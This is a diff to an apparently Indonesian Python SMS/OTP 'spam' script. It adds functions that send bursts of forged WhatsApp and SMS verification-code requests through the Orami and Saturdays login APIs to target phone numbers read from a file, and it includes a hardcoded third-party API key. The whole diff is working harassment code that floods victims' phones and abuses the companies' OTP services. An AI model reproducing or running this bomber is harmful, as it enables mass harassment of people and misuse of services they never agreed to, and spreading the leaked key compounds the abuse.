@@ -185,6 +185,68 @@ class spam:
                 gagal += 1
         print(f"jumlah rupa-rupa: {berhasil}/{gagal}")
 
+    def orami(nom):
+        berhasil = 0
+        gagal = 0
+        for i in range(3):
+            url = "https://passport-api.orami.co.id/api/otp/send/"
+            header = {
+                "accept": "application/json, text/plain, */*",
+                "accept-encoding": "gzip, deflate, br",
+                "accept-language": "id,en;q=0.9,id-ID;q=0.8",
+                "content-length": "46",
+                "content-type": "application/json",
+                "origin": "https://passport.orami.co.id",
+                "referer": "https://passport.orami.co.id/",
+                "sec-ch-ua-mobile": "?1",
+                "sec-ch-ua-platform": "Android",
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-site",
+                "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
+            }
+            data = {"phone": "+62"+nom, "method": "whatsapp",
+                    "attempt_count": 1, "max_attempt": 3, "cooldown": 29}
+            dataurljson = json.dumps(data)
+            r1 = requests.Session().post(url, headers=header, data=dataurljson).text
+            if "phone" in r1:
+                berhasil += 1
+            else:
+                gagal += 1
+        print(f"jumlah orami: {berhasil}/{gagal}")
+
+    def saturdeys(nom):
+        berhasil = 0
+        gagal = 0
+        for i in range(5):
+            url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
+            header = {"Accept": "*/*",
+                      "Accept-Encoding": "gzip, deflate, br",
+                      "Accept-Language": "id,en;q=0.9,id-ID;q=0.8",
+                      "Authorization": "undefined",
+                      "Connection": "keep-alive",
+                      "Content-Length": "55",
+                      "Content-Type": "application/json",
+                      "Host": "beta.api.saturdays.com",
+                      "Origin": "https://saturdays.com",
+                      "platform": "mweb",
+                      "Referer": "https://saturdays.com/",
+                      "sec-ch-ua-mobile": "?0",
+                      "sec-ch-ua-platform": "Windows",
+                      "Sec-Fetch-Dest": "empty",
+                      "Sec-Fetch-Mode": "cors",
+                      "Sec-Fetch-Site": "same-site",
+                      "User-Agent": ua.random,
+                      "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", }
+            data = {"number": nom, "country_code": "+62", "type": ""}
+            dataurljson = json.dumps(data)
+            r1 = requests.Session().post(url, headers=header, data=dataurljson).text
+            if "OTP dikirim ke nomor telepon Anda!" in r1:
+                berhasil += 1
+            else:
+                gagal += 1
+        print(f"jumlah Saturdey: {berhasil}/{gagal}")
+
 
 def tmpl():
     try:
@@ -219,6 +281,8 @@ def sms(file):
                 spam.oyo(nom)
                 spam.olx(nom)
                 spam.ruparupa(nom)
+                spam.orami(nom)
+                spam.saturdeys(nom)
                 print(f"{c.lb}0{nom} ~> Ini nomor yang ke {c.lc}{on}{c.lp}\n")
             elif len(nom) >= 10:
                 spam.fav(nom)
@@ -226,6 +290,8 @@ def sms(file):
                 spam.oyo(nom)
                 spam.olx(nom)
                 spam.ruparupa(nom)
+                spam.orami(nom)
+                spam.saturdeys(nom)
                 print(f"{c.lb}0{nom} ~> Ini nomor yang ke {c.lr}{on}{c.lp}\n")
         ojk.close()
     except AttributeError:
